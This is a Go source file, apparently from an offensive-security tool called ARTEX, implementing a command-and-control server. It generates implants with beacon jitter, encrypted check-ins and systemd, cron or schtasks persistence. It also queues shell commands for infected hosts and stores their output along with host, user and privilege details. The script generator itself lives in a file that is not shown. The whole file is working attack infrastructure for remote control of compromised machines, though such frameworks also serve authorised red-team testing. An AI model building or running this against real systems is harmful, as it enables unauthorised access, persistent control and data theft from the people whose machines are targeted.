// Package c2 implements a self-contained command-and-control capability for
// ARTEX: implant generation, beacon/result HTTP endpoints, an operator
// console, and an optional dedicated listener.
//
// The semantics are modeled on the Mamba RMM (registry/task lifecycle,
// malleable profile paths, encrypted check-ins) but the code is original —
// see THIRD_PARTY.md for attribution notes.
package c2

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

// StaleAfter returns how long after the last check-in an implant with the
// given sleep/jitter should be considered stale (three full cycles, min 90s).
func StaleAfter(sleepSeconds, jitterPct int) time.Duration {
	cycle := time.Duration(sleepSeconds) * time.Second
	if jitterPct > 0 {
		cycle += cycle * time.Duration(jitterPct) / 100
	}
	if cycle < 30*time.Second {
		cycle = 30 * time.Second
	}
	return 3 * cycle
}

// Implant is a registered beacon. Build-time fields are fixed when the
// implant script is generated; live fields are updated on every check-in.
type Implant struct {
	ID           string    `json:"id"`                 // "c2_<hex>"
	Token        string    `json:"token"`              // per-implant secret (auth header + AES key material)
	Label        string    `json:"label,omitempty"`    // operator label
	Platform     string    `json:"platform"`           // linux | windows
	Runtime      string    `json:"runtime"`            // bash | python3 | powershell
	Encrypt      string    `json:"encrypt"`            // none | aes
	BeaconPath   string    `json:"beacon_path"`        // malleable check-in path, e.g. "api/update"
	RespPath     string    `json:"resp_path"`          // malleable result path, e.g. "api/response"
	SleepSeconds int       `json:"sleep_seconds"`      // base check-in interval
	JitterPct    int       `json:"jitter_pct"`         // +/- percent applied to sleep
	Persistence  string    `json:"persistence"`        // none | systemd | cron | schtasks
	BaseURL      string    `json:"base_url,omitempty"` // recorded callback base for display
	CreatedAt    time.Time `json:"created_at"`

	// Live state (updated on check-in).
	FirstSeen  time.Time `json:"first_seen,omitempty"`
	LastSeen   time.Time `json:"last_seen,omitempty"`
	Host       string    `json:"host,omitempty"`
	User       string    `json:"user,omitempty"`
	OS         string    `json:"os,omitempty"`
	Arch       string    `json:"arch,omitempty"`
	Ver        string    `json:"ver,omitempty"`
	CWD        string    `json:"cwd,omitempty"`
	RemoteAddr string    `json:"remote_addr,omitempty"`
	PID        int       `json:"pid,omitempty"`
	Elevated   bool      `json:"elevated,omitempty"`
	Killed     bool      `json:"killed,omitempty"`
}

// Status derives a display status; killed/registered are sticky, active vs
// stale is computed from LastSeen.
func (i *Implant) Status() string {
	if i.Killed {
		return "killed"
	}
	if i.LastSeen.IsZero() {
		return "registered"
	}
	if time.Since(i.LastSeen) > StaleAfter(i.SleepSeconds, i.JitterPct) {
		return "stale"
	}
	return "active"
}

// Task is one queued command. shell tasks run args via the implant's shell;
// kill tasks instruct the implant to terminate (and remove persistence).
type Task struct {
	ID             int64     `json:"id"`
	ImplantID      string    `json:"implant_id"`
	Cmd            string    `json:"cmd"` // shell | kill
	Args           string    `json:"args,omitempty"`
	Status         string    `json:"status"` // pending | sent | done | failed
	TimeoutSeconds int       `json:"timeout_seconds,omitempty"`
	CreatedAt      time.Time `json:"created_at"`
	SentAt         time.Time `json:"sent_at,omitempty"`
	DoneAt         time.Time `json:"done_at,omitempty"`
}

// Result is one task output returned by an implant.
type Result struct {
	ID         int64     `json:"id"`
	ImplantID  string    `json:"implant_id"`
	TaskID     int64     `json:"task_id"`
	Output     string    `json:"output,omitempty"`
	Error      string    `json:"error,omitempty"`
	Exit       int       `json:"exit"`
	ReceivedAt time.Time `json:"received_at"`
}

// Beacon is the check-in payload an implant POSTs (JSON, then encoded).
type Beacon struct {
	ID       string `json:"id"`
	Host     string `json:"h,omitempty"`
	User     string `json:"u,omitempty"`
	OS       string `json:"o,omitempty"`
	Arch     string `json:"a,omitempty"`
	PID      int    `json:"p,omitempty"`
	Elevated bool   `json:"e,omitempty"`
	CWD      string `json:"c,omitempty"`
	Ver      string `json:"v,omitempty"`
}

// CommandOut is the pending command returned to an implant.
type CommandOut struct {
	Cmd    string `json:"cmd"`
	Args   string `json:"args,omitempty"`
	TaskID string `json:"task_id"`
}

// ResultIn is the result payload an implant POSTs after running a command.
type ResultIn struct {
	ID     string `json:"id"`
	TaskID string `json:"task_id"`
	Output string `json:"output,omitempty"`
	Error  string `json:"error,omitempty"`
	Exit   int    `json:"exit,omitempty"`
}

// Command names understood by implants. Keep in sync with implant.go.
const (
	CmdShell = "shell"
	CmdKill  = "kill"
)

const (
	maxResults     = 500
	maxBodyBytes   = 1 << 20
	defaultTimeout = 120
)

// Manager owns all C2 state. It is safe for concurrent use. State is
// persisted as an append-only JSONL event log in <dir>/state.jsonl and
// rebuilt by replay on startup.
type Manager struct {
	mu      sync.Mutex
	dir     string
	logFile *os.File
	logSize int64

	implants     map[string]*Implant
	tasks        map[int64]*Task
	results      []Result
	nextTaskID   int64
	consoleToken string

	fallbackSecret string // optional global beacon secret (ARTEX_C2_SECRET)
}

// event is one JSONL line in the state log. Implant and task events are
// full-record upserts (last write wins by ID); result events append.
type event struct {
	Ev           string    `json:"ev"` // implant | task | result | meta
	TS           time.Time `json:"ts"`
	Implant      *Implant  `json:"implant,omitempty"`
	Task         *Task     `json:"task,omitempty"`
	Result       *Result   `json:"result,omitempty"`
	ConsoleToken string    `json:"console_token,omitempty"`
}

// NewManager opens (or creates) the C2 data directory and replays any
// existing state log.
func NewManager(dir string) (*Manager, error) {
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, fmt.Errorf("c2: mkdir %s: %w", dir, err)
	}
	m := &Manager{
		dir:            dir,
		implants:       map[string]*Implant{},
		tasks:          map[int64]*Task{},
		nextTaskID:     1,
		fallbackSecret: strings.TrimSpace(os.Getenv("ARTEX_C2_SECRET")),
	}
	if err := m.load(); err != nil {
		return nil, err
	}
	f, err := os.OpenFile(filepath.Join(dir, "state.jsonl"), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return nil, fmt.Errorf("c2: open state log: %w", err)
	}
	if fi, err := f.Stat(); err == nil {
		m.logSize = fi.Size()
	}
	m.logFile = f
	return m, nil
}

// load replays state.jsonl to rebuild in-memory state.
func (m *Manager) load() error {
	raw, err := os.ReadFile(filepath.Join(m.dir, "state.jsonl"))
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("c2: read state log: %w", err)
	}
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		var ev event
		if json.Unmarshal([]byte(line), &ev) != nil {
			continue // tolerate trailing partial lines
		}
		m.apply(&ev)
	}
	return nil
}

// apply folds one event into memory (used by load and appendEvent).
func (m *Manager) apply(ev *event) {
	switch ev.Ev {
	case "implant":
		if ev.Implant != nil && ev.Implant.ID != "" {
			m.implants[ev.Implant.ID] = ev.Implant
		}
	case "task":
		if ev.Task != nil && ev.Task.ID > 0 {
			m.tasks[ev.Task.ID] = ev.Task
			if ev.Task.ID >= m.nextTaskID {
				m.nextTaskID = ev.Task.ID + 1
			}
		}
	case "result":
		if ev.Result != nil {
			m.results = append(m.results, *ev.Result)
		}
	case "meta":
		if ev.ConsoleToken != "" {
			m.consoleToken = ev.ConsoleToken
		}
	}
}

// appendEvent persists one event to the JSONL log (with periodic compaction).
func (m *Manager) appendEvent(ev *event) {
	ev.TS = time.Now().UTC()
	line, err := json.Marshal(ev)
	if err != nil {
		return
	}
	if _, err := m.logFile.Write(append(line, '\n')); err != nil {
		return
	}
	m.logSize += int64(len(line)) + 1
	// Compact when the log outgrows a reasonable bound so startup replay stays cheap.
	if m.logSize > 8<<20 {
		m.compactLocked()
	}
}

// compactLocked rewrites the log to a single snapshot of current state.
// Callers must hold m.mu.
func (m *Manager) compactLocked() {
	path := filepath.Join(m.dir, "state.jsonl")
	tmp := path + ".tmp"
	f, err := os.OpenFile(tmp, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
	if err != nil {
		return
	}
	w := func(ev *event) {
		ev.TS = time.Now().UTC()
		line, err := json.Marshal(ev)
		if err == nil {
			_, _ = f.Write(append(line, '\n'))
		}
	}
	for _, im := range m.implants {
		w(&event{Ev: "implant", Implant: im})
	}
	for _, t := range m.tasks {
		w(&event{Ev: "task", Task: t})
	}
	for i := range m.results {
		w(&event{Ev: "result", Result: &m.results[i]})
	}
	if m.consoleToken != "" {
		w(&event{Ev: "meta", ConsoleToken: m.consoleToken})
	}
	_ = f.Close()
	if os.Rename(tmp, path) == nil {
		if fi, err := os.Stat(path); err == nil {
			m.logSize = fi.Size()
		}
		if m.logFile != nil {
			_ = m.logFile.Close()
		}
		if nf, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
			m.logFile = nf
		}
	}
}

// Close flushes and closes the state log.
func (m *Manager) Close() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.logFile != nil {
		err := m.logFile.Close()
		m.logFile = nil
		return err
	}
	return nil
}

// Dir returns the C2 data directory (build artifacts live under builds/).
func (m *Manager) Dir() string { return m.dir }

func newHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return hex.EncodeToString(b)
}

// validRuntime reports whether rt is a supported implant runtime.
func validRuntime(rt string) bool {
	switch rt {
	case "bash", "python3", "powershell":
		return true
	}
	return false
}

// validPlatform reports whether p is a supported target platform.
func validPlatform(p string) bool {
	switch p {
	case "linux", "windows":
		return true
	}
	return false
}

// cleanProfilePath normalizes a malleable profile path ("api/update").
func cleanProfilePath(p string) (string, error) {
	p = strings.Trim(strings.TrimSpace(p), "/")
	if p == "" {
		return "", fmt.Errorf("empty path")
	}
	for _, seg := range strings.Split(p, "/") {
		if seg == "" || seg == "." || seg == ".." || strings.ContainsAny(seg, "?# \t\r\n") {
			return "", fmt.Errorf("invalid path segment %q", seg)
		}
	}
	return p, nil
}

// BuildOpts describes an implant to generate. All fields are validated in
// BuildImplant.
type BuildOpts struct {
	Label        string // operator label (optional)
	Platform     string // linux | windows (default linux)
	Runtime      string // bash | python3 | powershell (default: bash on linux, powershell on windows)
	Encrypt      string // none | aes (default none; bash + powershell support aes)
	BeaconPath   string // malleable check-in path (default api/update)
	RespPath     string // malleable result path (default api/response)
	SleepSeconds int    // base check-in interval (default 30)
	JitterPct    int    // +/- sleep jitter percent (default 20, capped 0-80)
	Persistence  string // none | systemd | cron (linux) | none | schtasks (windows); default none
	BaseURL      string // callback base URL for the generated script
}

// BuildImplant registers a new implant, generates its script and install
// helpers under builds/<id>/, and returns the implant record.
func (m *Manager) BuildImplant(o BuildOpts) (*Implant, error) {
	if o.Platform == "" {
		o.Platform = "linux"
	}
	if !validPlatform(o.Platform) {
		return nil, fmt.Errorf("c2: unsupported platform %q (linux|windows)", o.Platform)
	}
	if o.Runtime == "" {
		if o.Platform == "windows" {
			o.Runtime = "powershell"
		} else {
			o.Runtime = "bash"
		}
	}
	if !validRuntime(o.Runtime) {
		return nil, fmt.Errorf("c2: unsupported runtime %q (bash|python3|powershell)", o.Runtime)
	}
	if o.Platform == "windows" && o.Runtime != "powershell" {
		return nil, fmt.Errorf("c2: windows implants require powershell runtime")
	}
	if o.Encrypt == "" {
		o.Encrypt = "none"
	}
	if o.Encrypt != "none" && o.Encrypt != "aes" {
		return nil, fmt.Errorf("c2: unsupported encrypt %q (none|aes)", o.Encrypt)
	}
	if o.Encrypt == "aes" && o.Runtime == "python3" {
		return nil, fmt.Errorf("c2: python3 runtime supports encrypt=none only (no stdlib AES)")
	}
	if o.SleepSeconds <= 0 {
		o.SleepSeconds = 30
	}
	if o.SleepSeconds > 86400 {
		o.SleepSeconds = 86400
	}
	if o.JitterPct < 0 {
		o.JitterPct = 0
	}
	if o.JitterPct > 80 {
		o.JitterPct = 80
	}
	if o.JitterPct == 0 {
		o.JitterPct = 20
	}
	if o.Persistence == "" {
		o.Persistence = "none"
	}
	switch o.Persistence {
	case "none":
	case "systemd", "cron":
		if o.Platform != "linux" {
			return nil, fmt.Errorf("c2: persistence %q requires linux", o.Persistence)
		}
	case "schtasks":
		if o.Platform != "windows" {
			return nil, fmt.Errorf("c2: persistence %q requires windows", o.Persistence)
		}
	default:
		return nil, fmt.Errorf("c2: unsupported persistence %q", o.Persistence)
	}
	bPath := o.BeaconPath
	if bPath == "" {
		bPath = "update"
	}
	rPath := o.RespPath
	if rPath == "" {
		rPath = "response"
	}
	bPath, err := cleanProfilePath(bPath)
	if err != nil {
		return nil, fmt.Errorf("c2: beacon_path: %w", err)
	}
	if bPath == "api/c2" || strings.HasPrefix(bPath, "api/c2/") || strings.HasPrefix(bPath, "c2/ui") {
		return nil, fmt.Errorf("c2: beacon_path %q collides with the management endpoints", bPath)
	}
	rPath, err2 := cleanProfilePath(rPath)
	if err2 != nil {
		return nil, fmt.Errorf("c2: resp_path: %w", err2)
	}
	if rPath == bPath {
		return nil, fmt.Errorf("c2: resp_path must differ from beacon_path")
	}
	if strings.ContainsAny(o.Label, "\r\n") {
		return nil, fmt.Errorf("c2: label must be single-line")
	}

	im := &Implant{
		ID:           "c2_" + newHex(8),
		Token:        newHex(24),
		Label:        o.Label,
		Platform:     o.Platform,
		Runtime:      o.Runtime,
		Encrypt:      o.Encrypt,
		BeaconPath:   bPath,
		RespPath:     rPath,
		SleepSeconds: o.SleepSeconds,
		JitterPct:    o.JitterPct,
		Persistence:  o.Persistence,
		BaseURL:      strings.TrimRight(strings.TrimSpace(o.BaseURL), "/"),
		CreatedAt:    time.Now().UTC(),
	}
	if err := writeImplantFiles(m.dir, im); err != nil {
		return nil, err
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	m.implants[im.ID] = im
	m.appendEvent(&event{Ev: "implant", Implant: im})
	return im, nil
}

// Get returns a copy of the implant record.
func (m *Manager) Get(id string) (Implant, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	im, ok := m.implants[id]
	if !ok {
		return Implant{}, false
	}
	return *im, true
}

// List returns all implants, newest first.
func (m *Manager) List() []Implant {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]Implant, 0, len(m.implants))
	for _, im := range m.implants {
		out = append(out, *im)
	}
	sort.Slice(out, func(a, b int) bool { return out[a].CreatedAt.After(out[b].CreatedAt) })
	return out
}

// Count returns the number of registered implants.
func (m *Manager) Count() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.implants)
}

// VerifySecret checks an implant's auth secret. The per-implant token is
// always accepted; the global fallback secret (ARTEX_C2_SECRET) is accepted
// for any implant so shared builds stay simple.
func (m *Manager) VerifySecret(id, secret string) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	im, ok := m.implants[id]
	if !ok {
		return false
	}
	return secret != "" && (secret == im.Token || secret == m.fallbackSecret)
}

// Touch records a successful check-in, refreshing live host info.
func (m *Manager) Touch(b Beacon, remoteAddr string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	im, ok := m.implants[b.ID]
	if !ok || im.Killed {
		return
	}
	now := time.Now().UTC()
	if im.FirstSeen.IsZero() {
		im.FirstSeen = now
	}
	im.LastSeen = now
	im.Host, im.User, im.OS, im.Arch = b.Host, b.User, b.OS, b.Arch
	im.Ver, im.CWD, im.RemoteAddr = b.Ver, b.CWD, remoteAddr
	im.PID, im.Elevated = b.PID, b.Elevated
	m.appendEvent(&event{Ev: "implant", Implant: im})
}

// AddTask queues a command for an implant. kill additionally marks the
// implant killed so it stops appearing active.
func (m *Manager) AddTask(implantID, cmd, args string, timeoutSeconds int) (*Task, error) {
	if cmd != CmdShell && cmd != CmdKill {
		return nil, fmt.Errorf("c2: unsupported cmd %q (shell|kill)", cmd)
	}
	if cmd == CmdKill {
		args = ""
	} else if strings.TrimSpace(args) == "" {
		return nil, fmt.Errorf("c2: shell task requires args")
	}
	if timeoutSeconds <= 0 {
		timeoutSeconds = defaultTimeout
	}
	if timeoutSeconds > 3600 {
		timeoutSeconds = 3600
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	im, ok := m.implants[implantID]
	if !ok {
		return nil, fmt.Errorf("c2: unknown implant %s", implantID)
	}
	if im.Killed {
		return nil, fmt.Errorf("c2: implant %s is killed", implantID)
	}
	t := &Task{
		ID:             m.nextTaskID,
		ImplantID:      implantID,
		Cmd:            cmd,
		Args:           args,
		Status:         "pending",
		TimeoutSeconds: timeoutSeconds,
		CreatedAt:      time.Now().UTC(),
	}
	m.nextTaskID++
	m.tasks[t.ID] = t
	if cmd == CmdKill {
		im.Killed = true
		m.appendEvent(&event{Ev: "implant", Implant: im})
	}
	m.appendEvent(&event{Ev: "task", Task: t})
	return t, nil
}

// Dequeue pops the oldest pending task for an implant and marks it sent.
func (m *Manager) Dequeue(implantID string) (*Task, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	ids := make([]int64, 0, len(m.tasks))
	for id, t := range m.tasks {
		if t.ImplantID == implantID && t.Status == "pending" {
			ids = append(ids, id)
		}
	}
	if len(ids) == 0 {
		return nil, false
	}
	sort.Slice(ids, func(a, b int) bool { return ids[a] < ids[b] })
	t := m.tasks[ids[0]]
	t.Status = "sent"
	t.SentAt = time.Now().UTC()
	m.appendEvent(&event{Ev: "task", Task: t})
	return t, true
}

// AddResult records a task result and marks the task done. Results for
// unknown task IDs are still recorded so output is never silently dropped.
func (m *Manager) AddResult(implantID string, taskID int64, output, errMsg string, exitCode int) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(output) > 1<<18 {
		output = output[:(1 << 18)]
	}
	if len(errMsg) > 1<<16 {
		errMsg = errMsg[:(1 << 16)]
	}
	r := Result{
		ID:         int64(len(m.results)) + 1,
		ImplantID:  implantID,
		TaskID:     taskID,
		Output:     output,
		Error:      errMsg,
		Exit:       exitCode,
		ReceivedAt: time.Now().UTC(),
	}
	m.results = append(m.results, r)
	if len(m.results) > maxResults {
		m.results = m.results[len(m.results)-maxResults:]
	}
	m.appendEvent(&event{Ev: "result", Result: &r})
	if t, ok := m.tasks[taskID]; ok && t.ImplantID == implantID {
		t.Status = "done"
		t.DoneAt = time.Now().UTC()
		m.appendEvent(&event{Ev: "task", Task: t})
	}
}

// Results returns recent results for an implant, newest first.
func (m *Manager) Results(implantID string, limit int) []Result {
	m.mu.Lock()
	defer m.mu.Unlock()
	if limit <= 0 || limit > 100 {
		limit = 20
	}
	out := make([]Result, 0, limit)
	for i := len(m.results) - 1; i >= 0 && len(out) < limit; i-- {
		if implantID == "" || m.results[i].ImplantID == implantID {
			out = append(out, m.results[i])
		}
	}
	return out
}

// Tasks returns recent tasks for an implant, newest first.
func (m *Manager) Tasks(implantID string, limit int) []Task {
	m.mu.Lock()
	defer m.mu.Unlock()
	if limit <= 0 || limit > 100 {
		limit = 20
	}
	all := make([]Task, 0, len(m.tasks))
	for _, t := range m.tasks {
		if implantID == "" || t.ImplantID == implantID {
			all = append(all, *t)
		}
	}
	sort.Slice(all, func(a, b int) bool { return all[a].ID > all[b].ID })
	if len(all) > limit {
		all = all[:limit]
	}
	return all
}

// PendingCount returns how many tasks are still queued/sent for an implant.
func (m *Manager) PendingCount(implantID string) int {
	m.mu.Lock()
	defer m.mu.Unlock()
	n := 0
	for _, t := range m.tasks {
		if t.ImplantID == implantID && (t.Status == "pending" || t.Status == "sent") {
			n++
		}
	}
	return n
}

// BuildDir is where generated artifacts for an implant live.
func (m *Manager) BuildDir(id string) string {
	return filepath.Join(m.dir, "builds", id)
}

// ImplantFile returns the path and base filename of an implant's main script.
func (m *Manager) ImplantFile(id string) (string, string, error) {
	im, ok := m.Get(id)
	if !ok {
		return "", "", fmt.Errorf("c2: unknown implant %s", id)
	}
	name := implantFileName(im.Runtime)
	return filepath.Join(m.BuildDir(id), name), name, nil
}

// ConsoleToken returns the operator console token, creating and persisting
// one on first use.
func (m *Manager) ConsoleToken() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.consoleToken == "" {
		m.consoleToken = newHex(16)
		m.appendEvent(&event{Ev: "meta", ConsoleToken: m.consoleToken})
	}
	return m.consoleToken
}
